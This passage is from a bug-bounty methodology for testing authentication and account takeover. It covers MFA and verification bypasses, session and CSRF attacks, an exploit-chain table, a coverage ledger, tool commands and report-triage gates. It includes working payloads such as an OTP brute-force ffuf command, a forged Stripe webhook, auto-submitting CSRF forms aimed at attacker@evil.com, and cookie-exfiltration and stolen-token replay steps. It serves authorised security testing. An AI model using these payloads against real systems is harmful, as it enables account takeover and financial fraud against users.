- [ ] **MFA push notification fatigue** — send repeated Duo/Okta Verify pushes to victim; no rate-limit on push requests; user accepts under fatigue; report as design flaw — "no rate limit on push approval requests"
- [ ] **2FA not enforced on API / mobile endpoint** ⚡ — beyond version prefix: test `Content-Type: application/x-www-form-urlencoded` vs `application/json`; `/m/` `/app/` `/mobile/` prefixes; GraphQL `mutation { login }` vs REST `/login`; older OAuth `password` grant; any path issuing session token without MFA middleware

**→ Phase 4 exit:** Found response manipulation (400→200)? → P1, write immediately. Found OTP in response body? → P1. Found step skip? → P1. Found MFA gap on API endpoint? → P2, confirm it issues a full session. Move to Phase 5 if email/phone verify or payment gates exist; else skip to Phase 6.

---

## Phase 5 — Verification Bypasses

### Email / Phone

- [ ] **Email verification token swap** — verify accountA's email using accountB's token from URL; also try replaying already-used token
- [ ] **Email verification step skip** — after registration, craft direct API call to first verified-only endpoint; check if server enforces `email_verified` or just reads it from client-supplied session
- [ ] **Phone/SMS OTP brute** — 4-digit = 10,000 combinations; check separate rate-limit pool from login OTP
  ```bash
  ffuf -u https://target/verify-phone -X POST -d '{"code":"FUZZ"}' \
    -w <(seq -w 0000 9999) -H 'Cookie: session=<tok>' -mc 200
  ```
- [ ] **Rate-limit reset on new session** — get new session token; OTP counter resets → unlimited retries across sessions
- [ ] **Email verification not re-triggered on email change** — user changes email to new address; no new verification link sent to new address; attacker sets unowned email as account identifier without ever proving ownership; also test: does email_verified flag reset to false or remain true after change?
  ```bash
  # Change to attacker-controlled address; check if verification required
  curl -X PATCH https://target/api/user -H 'Authorization: Bearer <tok>' \
    -d '{"email":"attacker@evil.com"}'
  # Then check: can attacker now log in via new email without verifying it?
  ```

### KYC / Identity

- [ ] **KYC bypass via param injection** — inject `kyc_verified=true`, `identity_verified=true`, `verification_status=approved` in PATCH /user or onboarding body
- [ ] **KYC step skip** — POST directly to `/api/kyc/complete` or first post-KYC endpoint; skip document upload entirely
- [ ] **KYC race** — submit document upload and simultaneously poll for feature unlock; race condition between upload-received and verification-required check

### Payment / Subscription Gates

- [ ] **Subscription gate bypass** — inject `plan=enterprise`, `paid=true`, `subscription_active=true`; POST to `/api/orders/complete` with `total=0`; test checkout webhook with forged Stripe event
  ```bash
  # Forged Stripe webhook (test if signature verified)
  curl -X POST https://target/webhooks/stripe -H 'Content-Type: application/json' \
    -d '{"type":"checkout.session.completed","data":{"object":{"customer":"cus_attacker","amount_total":0}}}'
  ```
- [ ] **Price manipulation** — `price=-1`, `quantity=-1`, `discount=100`, `currency=JPY` (send cents-equivalent of $0.01 USD)
- [ ] **Coupon stacking / race** — apply same coupon twice via concurrent requests before server validates single-use

**→ Phase 5 exit:** Found subscription gate bypass or price manipulation? → P1/P2, quantify financial impact. Found KYC bypass? → P2, document what feature was unlocked. Found email verify not re-triggered? → P2 if email used as identity anchor. Move to Phase 6 for all authenticated tests.

---

## Phase 6 — Authenticated Session & ATO Chains

### Session Management

- [ ] Session not invalidated on logout — capture token; logout; replay token to `/api/me` — should 401
- [ ] Session not invalidated on password change — change password on accountA; old token still works
- [ ] Session not invalidated on email change — same test after email update
- [ ] Cookie flags — `Secure` (transmit only HTTPS), `HttpOnly` (no JS access), `SameSite=Strict/Lax` (CSRF mitigation); missing = exploitable chain
- [ ] Session fixation — set `Cookie: session=attacker_chosen_value` on GET `/login`; complete login; check if same value is now authenticated
- [ ] Parallel sessions — no invalidation of prior sessions; useful for persistence after ATO detected
- [ ] **Session not invalidated across devices** — change password on device A; all other device sessions (mobile, other browser, API tokens) remain valid; test: login on two browsers, change password on browser A, confirm browser B session still works
- [ ] **Cookie tossing** ⚡ — attacker controls `evil.target.com` (subdomain takeover or XSS); sets `Cookie: session=attacker_value; Domain=.target.com`; parent domain receives attacker-planted cookie → session fixation via subdomain; bypasses HttpOnly because it's set server-side on the subdomain
  ```bash
  # From controlled subdomain, set parent-domain cookie
  # Response header: Set-Cookie: session=ATTACKER_SESSION; Domain=.target.com; Path=/
  # Then victim navigates to target.com — their browser sends attacker's session value
  ```
- [ ] **SameSite=None without Secure flag** — `SameSite=None` only valid over HTTPS; browser still sends cookie over HTTP if `Secure` flag absent; intercept on any HTTP resource → session theft; also: `SameSite` absent entirely = browser default (Lax in modern, None in legacy) → test both behaviors
  ```bash
  curl -v https://target/ 2>&1 | grep -i 'set-cookie' | grep -iv 'secure\|samesite=strict\|samesite=lax'
  ```
- [ ] **Weak session entropy** — session token is MD5/SHA1 of `username+timestamp`, sequential integer, or short random string; extract multiple tokens, analyze pattern; `hashcat` or custom script to predict next token
  ```bash
  # Capture 5 session tokens; check for patterns
  for i in $(seq 5); do curl -s -c /tmp/c$i -X POST https://target/login \
    -d "user=test$i&pass=Abc123" && grep -i session /tmp/c$i; done
  ```
- [ ] **HttpOnly missing on session cookie → XSS ATO chain** — `HttpOnly` absent; any XSS (even self-XSS or stored-XSS in low-privilege field) becomes session theft → ATO; flag every missing HttpOnly on the primary session cookie; not standalone P1 but critical chain enabler

### ATO Chains (Authenticated Primitives)

- [ ] **Email-change × SSO account-linking** ⚡P1 — change email to `attacker@gmail.com`; link Google SSO to account; victims who originally registered with that Google account can no longer log in; attacker logs in via Google as victim. Most-upvoted H1 report class.
- [ ] **CSRF on email / password / phone change** — `SameSite=None` + no CSRF token = one-click ATO via CSRF page
  ```html
  <form action="https://target/settings/email" method="POST">
    <input name="email" value="attacker@evil.com">
    <input type="submit">
  </form><script>document.forms[0].submit()</script>
  ```
- [ ] **SCIM provisioning API abuse** ⚡P1 — `GET /scim/v2/Users` (enumerate all accounts); `PATCH /scim/v2/Users/{id}` (modify email/role/active status without MFA); `DELETE /scim/v2/Users/{id}` (delete users); check if SCIM token is weaker than user auth
- [ ] **Invite link hijacking** — invite `attacker@evil.com` to org; accept invite from different session (session-B); invited identity merges with session-B user
- [ ] **"Login as" / admin impersonation abuse** — support/admin tools with `?user_id=` or `?impersonate=` param; check if accessible from lower privilege role; BOLA on impersonation target
- [ ] **Login CSRF** ⚡ — no CSRF token on login form; force victim to authenticate as attacker account via CSRF page; victim's actions (uploads, purchases, sensitive data entry, OAuth grants) now in attacker's session; also enables stored-XSS escalation (attacker plants XSS as their own content, victim forced to log in as attacker, XSS fires)
  ```html
  <!-- CSRF page: force victim to log in as attacker -->
  <form action="https://target/login" method="POST" id="f">
    <input name="username" value="attacker@evil.com">
    <input name="password" value="AttackerKnownPassword1!">
  </form><script>document.getElementById('f').submit()</script>
  ```
- [ ] **Unverified email-based account merge** ⚡P1 — two accounts with same email (one via OAuth, one via password registration) auto-merged without proving ownership of both; attacker registers via Google OAuth using victim's email → accounts merge → attacker controls merged account; or: register password account with victim's email before victim uses OAuth → merge on victim's first SSO login
- [ ] **AiTM (Adversary-in-the-Middle) reverse proxy** ⚡P1 — Evilginx2/Modlishka/Muraena proxies victim's real login including MFA completion; post-MFA session cookie captured by proxy; attacker replays cookie to target directly; bypasses TOTP, push, SMS entirely; report = "session token theft via AiTM, MFA provides no protection against token replay"
  ```bash
  # Verify: does target bind session token to IP or User-Agent?
  # If not → stolen token from any IP is fully valid → AiTM is P1
  curl -s https://target/api/me -H 'Cookie: session=<stolen_post_mfa_token>' \
    --user-agent "Mozilla/5.0 (different UA)"
  ```

### Infrastructure / Transport Auth Bypasses

- [ ] **Subdomain takeover → cookie theft** — dangling CNAME on `auth.target.com` / `sso.target.com`; take over; serve JS that exfils `SameSite=None` cookies from parent domain
- [ ] **CORS + credentials misconfiguration** — `Origin: https://attacker.com` on authenticated endpoint; if `Access-Control-Allow-Origin: https://attacker.com` + `Allow-Credentials: true` → steal API responses via browser
  ```bash
  curl -H 'Origin: https://attacker.com' -H 'Cookie: session=<tok>' https://target/api/me -v 2>&1 | grep -i access-control
  ```
- [ ] **HTTP request smuggling to bypass auth** — CL.TE/TE.CL desync; prefix attacker's request with internal-trusted header (`X-Internal: true`); backend sees already-authenticated request. Tool: `smuggler.py`
- [ ] **Cache poisoning auth bypass** — poison CDN cache key with `X-Forwarded-Host` → unauthenticated response cached for authenticated URL; served to all users
- [ ] **HTTP method override bypass** — `X-HTTP-Method-Override: DELETE` on POST to admin endpoint that only auth-checks the declared method
- [ ] **Path traversal to bypass auth middleware** — `/api/v1/admin/../users/me`; `%2f` encoded slashes; framework routes differently than auth middleware

### Protocol-Level Auth

- [ ] **WebSocket auth bypass** — auth checked only at handshake (`Upgrade` request); subsequent messages not validated; different `Origin` header accepted at handshake
  ```bash
  wscat -c wss://target/ws -H 'Origin: https://evil.com'  # test origin check
  # After connect, send admin commands without re-authing
  ```
- [ ] **SSE / streaming auth bypass** — `GET /api/events` checked at connection open only; hijack stream mid-connection by replaying EventSource URL with another user's session
- [ ] **API key auth issues** — keys in JS bundles, localStorage, query params (`?api_key=`); scope escalation (request `scope=admin` on `/oauth/token`); old key active after rotation
  ```bash
  grep -rE '(api_key|apiKey|x-api-key)\s*[=:]\s*["'"'"'][A-Za-z0-9_-]{20,}' ./ --include="*.js"
  ```

### Privilege Escalation (Authenticated)

- [ ] Role/plan param trusted — `role=admin`, `is_admin=true`, `account_type=staff` in PATCH /user or /profile
- [ ] Mass assignment on PATCH/PUT — send complete object with all fields including privileged ones; server blindly merges
- [ ] Horizontal BOLA — swap `user_id` / `account_id` / `org_id` / `team_id` with victim's; probe with both numeric increment and UUID enumeration
- [ ] Vertical privesc — viewer/member role calling `/api/admin/*` or `/api/billing/*`; check every privileged endpoint against lowest role

### Cloud / Managed Auth Misconfigs

- [ ] **Firebase Auth** — `POST https://<project>.firebaseapp.com/__/auth/action?mode=resetPassword&oobCode=<brute>` — short oobCode brutable; `email_verified` claim writable client-side
- [ ] **Auth0** — `GET https://<tenant>.auth0.com/.well-known/openid-configuration` → enumerate; check if Management API token in JS; `POST /dbconnections/signup` open if `disableSignups` not enforced
- [ ] **Cognito** — `USER_PASSWORD_AUTH` flow ignores MFA in some configs; check `InitiateAuth` without SRP; `AdminCreateUser` if credentials in JS
  ```bash
  aws cognito-idp initiate-auth --auth-flow USER_PASSWORD_AUTH \
    --client-id <id> --auth-parameters USERNAME=victim@x.com,PASSWORD=Abc123!
  ```
- [ ] **Okta** — check for `FACTOR_ENROLL` state that can be skipped; `sessionToken` issued before MFA factor satisfied; legacy `/api/v1/authn` vs newer `/oauth2/` parity
- [ ] **Supabase** — anon key in JS → `POST /auth/v1/signup` open; `auth.users` readable via anon key if RLS misconfigured; `service_role` key in JS = full DB access

### Federated / Cross-Platform Identity

- [ ] **Federated identity confusion** — register `Admin@target.com` (uppercase A) vs `admin@target.com`; server normalizes to same user; two accounts merge or one overrides
- [ ] **Sign-in with Apple/Google ID token replay** — ID token from AppA presented to AppB (`aud` not validated); single-use token replayed
- [ ] **Tenant-level auth service confusion** — shared auth microservice issues tokens valid across tenants; `sub` / `tenant_id` claim not scoped; cross-tenant session reuse
- [ ] **Mobile-specific auth bypasses** — deep link URI hijacking (`myapp://oauth/callback` registerable by attacker app on Android); certificate pinning bypass with Frida/objection; Android intent hijacking for OAuth redirect_uri

**→ Phase 6 exit:** Found email×SSO chain? → P1 now. Found SCIM unauthed? → P1. Found AiTM token replay with no IP binding? → P1. Found session not invalidated? → Check if it chains to data access before reporting. Move to Phase 7 to build the kill chain for every confirmed primitive.

---

## Phase 7 — P1 Chain Assembly

Primitives rarely land solo. Build the kill chain before writing the report.

| Chain | Impact | Severity |
|---|---|---|
| Host header injection → password reset link → ATO | Zero-interaction ATO on any account | P1 |
| Pre-registration hijack + SSO merge | Zero-click ATO before victim ever signs up | P1 |
| Punycode email normalization | Zero-click ATO, no account needed | P1 |
| PKCE downgrade + open redirect | Steal auth code → ATO | P1 |
| SAML XSW → arbitrary NameID | Impersonate any user incl. admin | P1 |
| JWT alg:none or RS256→HS256 | Forge token as any user | P1 |
| Email-change + SSO linking → account takeover | Auth ATO, no victim interaction | P1 |
| SCIM API unauthed/underauthed + modify email | Mass ATO across all users | P1 |
| MFA step-skip → authenticated as victim | Full ATO bypassing 2FA | P1 |
| CORS + creds + XSS chain | Exfil authenticated API responses | P1/P2 |
| Subdomain takeover + cookie theft | Steal session = ATO | P1 |
| OTP brute no rate-limit (any user) | Mass ATO scalable | P1 (mass impact multiplier) |
| Auth state machine OOO + session replay | ATO without knowing current password | P1 |
| `_entities` federation query + IDOR key | Cross-tenant data access, no ownership check | P1 |
| APQ registration + bypass WAF depth limit | Execute unrestricted query, exfil full DB | P1/P2 |
| Hasura `/v2/query` unauthed + raw SQL | Full DB read as unauthenticated attacker | P1 |
| GraphQL alias batching + login mutation | 100 password attempts = 1 HTTP request, rate-limit bypass | P1 |
| Relay `node(id)` IDOR + sensitive fields | Fetch any user's passwordHash/secrets by ID | P1/P2 |
| Subscription filter client-side + WS hijack | Realtime firehose of all users' data | P1 |
| Response manipulation (400→200) on OTP step | Full 2FA bypass, no OTP needed | P1 |
| OTP in response body + no rate-limit | Read OTP from response, submit instantly | P1 |
| OTP shared secret across accounts | Any user's TOTP code = all accounts | P1 |
| Login CSRF + stored XSS in attacker account | Victim forced to attacker session, XSS fires | P1/P2 |
| Cookie tossing (subdomain) + session fixation | ATO via subdomain cookie plant | P1 |
| Unverified email merge + OAuth pre-registration | ATO before victim ever creates account | P1 |
| AiTM proxy + no IP/UA session binding | Full ATO bypassing all MFA types | P1 |
| OAuth refresh token persists after logout | Silent re-auth days/weeks after logout | P1/P2 |
| Reset token in URL + third-party analytics | Token harvested via Referer, no email access needed | P1/P2 |
| JWT exp not validated + weak secret | Forge permanent non-expiring admin token | P1 |
| OAuth account linking without re-auth + CSRF | Permanent IdP link, one-click ATO | P1 |
| 2FA via password-change + no MFA on that flow | Authenticated ATO bypassing 2FA enforcement | P1/P2 |
| OAuth `request_uri` SSRF → IMDS | Cloud credential exfil via auth flow | P1 |
| SAML ACS URL SSRF → internal service | Internal pivot via IdP-initiated assertion POST | P1/P2 |

**P1 multiplier:** any finding becomes P1 when: (a) affects all users / no victim interaction, OR (b) no rate-limit → mass scale, OR (c) gives admin access.

---

## Coverage Ledger

All fields required before closing auth phase. Mark `✓` / `N/A` / `FINDING`.

```
setup_session_id_exported:
setup_two_accounts:
setup_blind_xss_planted:
setup_auth_flow_map_extracted:
setup_ratelimit_fingerprinted:

phase1_preregistration_hijack:
phase1_punycode_normalization:
phase1_concurrent_registration_race:
phase1_mass_assignment_signup:
phase1_email_header_injection:
phase1_email_enumeration:
phase1_unauth_sso_provider_reg:
phase1_open_client_registration:
phase1_account_lockout_abuse:

phase2_host_header_injection:
phase2_token_predictability:
phase2_token_reuse:
phase2_token_invalidation:
phase2_token_user_bound:
phase2_token_step_reuse:
phase2_magic_link_session_bound:
phase2_magic_link_prefetch:
phase2_deprov_timing:
phase2_concurrent_reset_tokens:
phase2_reset_valid_after_email_change:
phase2_reset_token_referer_leak:
phase2_session_token_in_url:
phase2_json_param_pollution:
phase2_ssrf_pivot_callback_url:

phase3_jwt_algnone:
phase3_jwt_algnone_mixedcase:
phase3_jwt_exp_not_validated:
phase3_jwt_alg_confusion:
phase3_jwt_jku_injection:
phase3_jwt_kid_sqli_traversal:
phase3_jwt_claims_validated:
phase3_jwt_weak_secret:
phase3_oauth_state_csrf:
phase3_oauth_state_nullbyte:
phase3_oauth_redirect_uri:
phase3_oauth_redirect_uri_trailing_slash:
phase3_oauth_code_reuse:
phase3_oauth_pkce_downgrade:
phase3_oauth_client_secret_js:
phase3_oauth_request_uri_ssrf:
phase3_oauth_refresh_rotation:
phase3_oauth_refresh_not_invalidated_on_logout:
phase3_oauth_device_flow:
phase3_oauth_scope_escalation:
phase3_oauth_account_linking_no_reauth:
phase3_saml_xsw:
phase3_saml_xxe:
phase3_saml_sig_skip:
phase3_saml_entityid_norm:
phase3_saml_replay:
phase3_saml_acs_ssrf:
phase3_null_type_confusion:
phase3_legacy_parity:
phase3_graphql_engine_fingerprint:
phase3_graphql_schema_recovery:
phase3_graphql_unauth_execution:
phase3_graphql_batch_alias_ratelimit:
phase3_graphql_federation_subgraph:
phase3_graphql_entities_query:
phase3_graphql_field_level_auth:
phase3_graphql_directive_bypass:
phase3_graphql_relay_node_idor:
phase3_graphql_persisted_query_abuse:
phase3_graphql_subscription_auth:
phase3_graphql_hasura_specific:
phase3_graphql_malformed_query_bypass:

phase4_mfa_step_skip:
phase4_otp_bruteforce:
phase4_otp_reuse:
phase4_otp_race:
phase4_enrollment_race:
phase4_remember_device:
phase4_legacy_mfa_gap:
phase4_backup_code_brute:
phase4_state_machine_oo:
phase4_client_side_burn:
phase4_webauthn_flaws:
phase4_response_manipulation_status:
phase4_response_manipulation_body:
phase4_otp_in_response_body:
phase4_otp_not_expiring:
phase4_totp_secret_refetchable:
phase4_totp_qr_refetchable:
phase4_2fa_bypass_password_change:
phase4_otp_shared_across_accounts:
phase4_concurrent_otp_race:
phase4_mfa_push_fatigue:
phase4_2fa_not_on_api_endpoint:

phase5_email_verify_swap:
phase5_email_verify_skip:
phase5_email_verify_not_retriggered_on_change:
phase5_phone_otp_brute:
phase5_kyc_param_inject:
phase5_kyc_step_skip:
phase5_payment_gate_bypass:
phase5_price_manipulation:
phase5_coupon_race:

phase6_session_logout:
phase6_session_pw_change:
phase6_session_email_change:
phase6_session_not_invalidated_across_devices:
phase6_cookie_flags:
phase6_cookie_tossing:
phase6_samesite_none_without_secure:
phase6_weak_session_entropy:
phase6_httponly_missing_session:
phase6_session_fixation:
phase6_email_sso_chain:
phase6_csrf_ato_chain:
phase6_login_csrf:
phase6_unverified_email_merge:
phase6_oauth_linking_without_reauth:
phase6_aitm_session_theft:
phase6_scim_abuse:
phase6_invite_hijack:
phase6_login_as_abuse:
phase6_subdomain_cookie_theft:
phase6_cors_creds:
phase6_request_smuggling:
phase6_cache_poison_auth:
phase6_method_override:
phase6_path_traversal_auth:
phase6_websocket_auth:
phase6_sse_auth:
phase6_api_key_issues:
phase6_mass_assignment:
phase6_horizontal_bola:
phase6_vertical_privesc:
phase6_firebase_auth:
phase6_auth0_issues:
phase6_cognito_issues:
phase6_okta_issues:
phase6_supabase_auth:
phase6_federated_confusion:
phase6_mobile_auth:
```

---

## Tool Paths & Alternatives

| Tool | Status | How to run |
|---|---|---|
| `jwt_tool` | Cloned | `python3 ~/tools/jwt_tool/jwt_tool.py <token> -t https://target/api/me` |
| `hashcat` | ✅ Installed | `hashcat -a 0 -m 16500 <token> rockyou.txt` |
| `zbarimg` | ✅ Installed | `zbarimg qr.png` → extracts otpauth URI from TOTP QR |
| `graphw00f` | ✅ Installed | `graphw00f -d -t https://target/graphql` |
| `clairvoyance` | ✅ Installed | `python3 -m clairvoyance -o schema.json https://target/graphql` |
| `graphql-cop` | Cloned | `python3 ~/tools/graphql-cop/graphql-cop.py -t https://target/graphql` |
| `graphql-path-enum` | ❌ Not available | **Alternative:** `clairvoyance` covers schema recovery; use `__type(name:"Query")` field enumeration manually |
| `smuggler.py` | Cloned | `python3 ~/.local/share/smuggler/smuggler.py -u https://target/` |
| `wscat` | ✅ Installed | `export PATH="$HOME/.npm-packages/bin:$PATH" && wscat -c wss://target/ws` |
| `webcrack` | npm blocked | **Alternative:** `npx webcrack <bundle.js>` (installs on demand) or `js-beautify` + manual read |
| `synchrony` | npm blocked | **Alternative:** `npx deobfuscator <file.js>` or use online synchrony at https://deobfuscate.io |
| `saml-raider` | Burp extension | **Alternative:** `base64 -d <<< "<SAMLResponse>" \| xmllint --format - \| vim` → edit → `base64 -w0` → resend |
| `InQL` | Burp extension | **Alternative:** `graphql-cop` + manual query construction cover 90% of the same checks |

---

## Common Mistakes

| Mistake | Fix |
|---|---|
| Running JWT tests when target uses session cookies | Do Step 0 triage — identify token format before any Phase 3 work |
| Skipping response manipulation because "too simple" | It pays $2,500–$12,000. Run it on every OTP endpoint, no exceptions |
| Testing 2FA only on web login — not on API/mobile | Always check `/api/`, `/m/`, GraphQL mutations, OAuth password grant |
| Reporting "session not invalidated" without chained impact | Without ATO or data leakage chain → P3/P4, likely N/A. Add the chain or kill it |
| Single-account BOLA tests | Two accounts mandatory. Single-account = incomplete PoC, triager will reject |
| Reporting OTP brute without confirming rate-limit gap | Confirm: per-IP bypass with `X-Forwarded-For`, per-account gap across sessions |
| Inflating SAML XXE to P1 without OOB confirmation | Confirm OOB with interactsh before submitting — blind XXE ≠ P1 without impact proof |
| Skipping GraphQL on REST-heavy targets | GraphQL often at `/api/graphql` or in mobile API bundle — always check |
| Writing report on first phase without checking chain | A P3 primitive + another P3 primitive often = P1. Always check Phase 7 chains first |
| Filling coverage ledger without actually testing | Mark N/A only when the feature literally doesn't exist on target, not when you skipped it |

---

## Kill Filter

> *Can an attacker exploit this RIGHT NOW against a real user who took no unusual action, causing ATO, PII exfil, financial theft, or privilege escalation?*

No → kill it. Don't write it.

| Severity | Examples |
|---|---|
| P1 | Pre-auth ATO (punycode, pre-reg hijack), MFA step-skip → any account, JWT alg:none, SAML XSW, host header injection, SCIM mass ATO, OTP brute + no rate-limit = mass scale |
| P2 | Auth-required ATO chain (email-change × SSO), PKCE downgrade → code theft, CORS + creds (requires attacker page), device auth flow abuse, Cognito MFA bypass |
| P3 | Session not invalidated on logout (no chained impact), weak token entropy (brute force required + time-limited window), account lockout DoS (no data access) |
| P4/N/A | Missing CSRF with SameSite=Lax (browser blocks), cosmetic 2FA UX gap, HttpOnly missing on non-session cookie, email enumeration with no usable data |

Downgrade honestly. Never inflate.

---

## Phase 8 — Triage Gate

> Run this BEFORE writing any report. One wrong answer = KILL IT. Move on.

### Step 8.1 — The 7-Question Gate (in order, stop on first fail)

**Q1: Can an attacker use this RIGHT NOW, step by step?**

Complete this template or kill it:
```
1. Setup:   I need [own account / another user's ID / no account]
2. Request: [exact HTTP method, URL, headers, body — copy-paste ready]
3. Result:  I can [ATO / read PII / bypass 2FA / escalate privilege]
4. Impact:  The real-world consequence is [account takeover / PII read / payment bypass]
5. Cost:    Time: [X minutes], Capital: [$0 / $X subscription required]
```
Cannot write step 2 as a real HTTP request → **KILL IT**.

**Q2: Is the impact on the program's accepted impact list?**

Auth-specific tier map:
- **Critical**: Pre-auth ATO (any user), MFA complete bypass, SAML XSW → any-account takeover, JWT alg:none
- **High**: Auth-required ATO chain, SCIM mass ATO, PKCE downgrade → code theft, 2FA step-skip (own account escalation)
- **Medium**: Single-user IDOR on non-critical data, OTP brute with no lockout (limited scale), CORS+creds (requires attacker page)
- **Low/N/A**: Session not invalidated post-logout (no chain), missing HttpOnly flag alone, email enumeration

Program explicitly excludes your bug class → **KILL IT**.

**Q3: Is the root cause in an in-scope asset?**

- Domain on scope list, production asset, not a third-party SSO provider (Okta, Auth0, Google)
- If scope page is SPA-rendered and you can't read it: mark "unconfirmed" — do not assume pass

Out-of-scope → **KILL IT**.

**Q4: Does it require privileged access an attacker can't realistically get?**

- "Admin can do X" = centralization risk = **KILL IT** (on 99% of programs)
- "Non-admin can do what only admin should" = valid
- "Requires compromised victim session to trigger" = questionable; low severity at best

**Q5: Is this already known / accepted behavior?**

Search: program's disclosed reports + GitHub issues + changelog + API docs.

Documented behavior → **KILL IT**.

**Q6: Can you prove impact beyond "technically possible"?**

Auth-specific bars:
- OTP brute → confirm lockout gap exists AND a code was accepted (not just 200 returned)
- JWT alg:none → confirm server returns your crafted identity (check `sub`/`email` in response)
- SAML XSW → confirm authenticated session issued for victim, not just 200 on forged assertion
- 2FA bypass → confirm you land on a protected resource, not just skip the 2FA page
- ATO chain → confirm victim account is controlled (password changed OR session issued)

Can only show "technically possible" → **DOWNGRADE severity**, don't kill.

**Q7: Is this a known-invalid auth bug class?**

Auth-specific never-submit list:
```
Session not invalidated on logout (no chain to ATO or data access)
Concurrent sessions allowed
Missing CSRF token on non-state-changing login form
OAuth client_secret in mobile app binary (known, expected)
JWT HS256 with unknown server secret (brute required — not a vuln unless key is weak)
Missing rate-limit on low-sensitivity endpoint (not OTP/reset/login)
CORS wildcard (*) without withCredentials + PII exfil PoC
SSRF DNS callback only (no internal service data returned)
Open redirect alone (no OAuth token theft chain)
Self-XSS in auth flows (only exploits own account)
Rate limit on login page behind Cloudflare
Email enumeration on registration (no usable impact beyond boolean)
GraphQL introspection alone (must demonstrate IDOR/auth bypass)
Pre-account takeover (extremely specific conditions — check program policy)
Host header injection alone (must prove reset link poisoned to attacker domain)
```

Matches any row → **KILL IT** (unless you can chain it — see Step 8.3).

**Q8: Identity check — which session, and does the bug survive cross-identity?**

MANDATORY for any authenticated finding:
```
1. Attacker session:  [user A — low-priv / free tier / attacker-controlled]
2. Victim resource:   [user B's data / tenant B's object / admin endpoint]
3. No-auth repro:     Does the same request work with NO auth header? [YES=missing auth / NO=BOLA]
4. Cross-identity:    Does it work under user B's session too? [YES=no bug / NO=authz gap confirmed]
5. Stale-cred repro:  Does a logged-out/expired session still get data? [YES=session bug]
```

- IDOR/BOLA: must work with session A reading session B's data
- Priv-esc: must work with low-priv reading high-priv — if both see it, no bug
- Auth bypass: must work WITHOUT a valid session

Cannot answer all identity questions → **treat as unproven, do not report**.

---

### Step 8.2 — 4 Pre-Submission Gates (ALL must pass)

**Gate 0: Reality Check (30 seconds)**
```
[ ] Bug confirmed with actual HTTP requests — not code reading alone
[ ] Asset is in scope — checked program scope page explicitly
[ ] Reproducible from a fresh session / fresh account
[ ] Evidence ready: screenshot, response body, or video
[ ] If validating someone else's write-up without replay credentials: state it explicitly
```

**Gate 1: Impact Validation (2 minutes)**
```
[ ] Can answer: "What can attacker DO that they couldn't before?"
[ ] Answer is more than "technically possible" (actual data / session / privilege in hand)
[ ] Real victim: another user's data, financial loss, admin access
[ ] Does not rely on victim performing an unlikely action
```

**Gate 2: Deduplication (5 minutes)**
```
[ ] Searched program's disclosed reports for this endpoint + bug class
[ ] Searched GitHub issues for target repo
[ ] Read most recent 5 disclosed reports for this program
[ ] Not a documented known issue or accepted behavior
[ ] Google: "TARGET_NAME AUTH_ENDPOINT_PATH bug bounty"
```

**Gate 3: Report Quality (10 minutes)**
```
[ ] Title: [Bug Class] in [Endpoint/Flow] allows [actor] to [impact]
[ ] Steps to Reproduce: curl command or Burp request — copy-pasteable
[ ] Evidence: screenshot/video of actual impact (not just HTTP 200)
[ ] Severity: CVSS vector computed by hand (see quick-ref below)
[ ] Remediation: 1–2 sentences of concrete fix
[ ] NEVER used "could potentially" or "may allow"
```

---

### Step 8.3 — Auth-Specific N/A Kill Signals

| Finding | Why it N/As | Kill signal — stop here |
|---|---|---|
| OTP brute — 15 requests returned 200 | No OTP code was actually accepted | 200 without valid code = rate-limit on wrong layer |
| JWT HS256 weak secret | Key must be cracked offline first; most programs require confirmed crack | No hashcat run showing cracked key |
| 2FA bypass via response manipulation | Only works in intercepting proxy; not remotely exploitable | Requires Burp — attacker can't do this against victim remotely |
| SAML metadata exposed | Disclosure only — aids attack but no standalone impact | No private signing key extracted |
| OAuth state missing on non-sensitive flow | No sensitive data in the auth code or token | Code/token doesn't give account access to attacker |
| Password reset token doesn't expire | Brute-force of reset token is impractical in most cases | Token space is large + sent to attacker-controlled email anyway |
| CORS + credentials on auth endpoint | `withCredentials` only works if CORS allows the specific origin | `Access-Control-Allow-Origin: *` blocks credentialed requests — CORS star != vuln |
| MFA "step skip" via direct navigation | App re-validates MFA state server-side on sensitive routes | Navigate to protected resource directly — if you get redirected back, no bug |
| Account lockout missing | Most programs don't pay unless OTP brute succeeds | Confirm an OTP code was accepted after N attempts |
| CSRF on login endpoint | Fixes session fixation not auth bypass; usually N/A | No session fixation chain demonstrated |

---

### Step 8.4 — Auth Chains That Upgrade Severity

| Standalone Finding | + Chain → | Upgraded Severity |
|---|---|---|
| Open redirect | + OAuth `redirect_uri` → auth code stolen | Critical ATO |
| Host header injection | + Password reset email uses injected host | High ATO |
| OTP brute (no lockout) | + Successful code accepted → account accessed | Medium/High |
| CORS wildcard | + Credentialed request exfils session token | High |
| Email enumeration | + Password spraying + no lockout = mass ATO | Medium |
| Self-XSS in account settings | + CSRF to trigger on victim without their action | Medium |
| Subdomain takeover | + OAuth `redirect_uri` registered at that subdomain | Critical ATO |
| GraphQL introspection | + Auth bypass mutation or cross-user node() IDOR | High |
| JWT `kid` path traversal | + Force `kid` to `/dev/null` → arbitrary signature accepted | Critical |
| Pre-registration account | + Victim registers same email → attacker controls their account | High/Critical |
| Magic link reuse | + Intercept + replay outside expiry window | High |
| 2FA backup code | + Separate rate-limit (brute 8 codes in separate session) | High |

---

### Step 8.5 — Auth CVSS Quick Reference

| Auth Finding | Score | Severity | CVSS Vector |
|---|---|---|---|
| Pre-auth ATO, no interaction | 9.8 | Critical | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| JWT alg:none any-account | 9.1 | Critical | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| SAML XSW any-account | 9.1 | Critical | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| Auth bypass → admin panel | 9.8 | Critical | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| MFA step-skip, own account | 7.5 | High | AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N |
| 2FA bypass → any account (brute) | 8.0 | High | AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N |
| PKCE downgrade → code theft | 8.1 | High | AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N |
| CORS + creds → session exfil | 7.5 | High | AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N |
| IDOR auth endpoint, cross-user | 6.5 | Medium | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |
| OAuth state CSRF | 6.1 | Medium | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |
